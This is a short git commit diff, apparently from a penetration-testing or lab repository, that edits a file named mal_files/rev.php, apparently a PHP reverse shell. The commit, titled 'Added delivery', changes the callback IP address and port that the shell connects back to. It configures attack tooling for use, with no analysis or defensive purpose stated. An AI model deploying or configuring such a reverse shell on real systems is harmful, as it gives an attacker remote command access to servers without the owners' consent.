2bfeb954da3100c102d6fa410b400a53171ecb10
ryuparish <ryuparish1115@gmail.com>
2021-10-02 23:55:41 -0700

    Added delivery

--- mal_files/rev.php
+++ mal_files/rev.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.10.14.23';  // CHANGE THIS
-$port = 1337;       // CHANGE THIS
+$ip = '10.10.14.3';  // CHANGE THIS
+$port = 4474;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
